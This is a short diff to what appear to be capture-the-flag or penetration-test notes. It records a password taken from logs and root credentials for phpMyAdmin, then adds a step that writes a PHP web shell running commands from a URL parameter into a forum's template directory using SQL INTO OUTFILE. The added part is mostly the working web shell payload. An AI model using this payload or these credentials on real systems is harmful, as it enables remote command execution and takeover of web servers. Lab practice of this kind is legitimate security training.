@@ -42,4 +42,9 @@ reading the logs , a line says: 'Failed password for invalid user !q\]Ej?*5K5cy*
 ## access phpMyAdmin
 
 login: root
+
 password: Fg-'kKXBj87E:aJ$
+
+## inject a webshell in sql 
+ressource: https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/pyload.php"
